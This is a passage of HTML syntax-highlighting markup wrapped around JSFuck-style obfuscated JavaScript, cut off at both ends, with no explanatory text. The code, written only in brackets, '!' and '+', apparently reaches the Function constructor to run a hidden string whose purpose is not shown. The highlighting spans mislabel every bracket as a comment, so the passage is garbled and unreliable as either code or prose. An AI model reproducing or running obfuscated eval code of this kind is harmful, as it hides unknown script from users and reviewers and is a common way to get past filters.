class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>((!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()((!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>()<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span 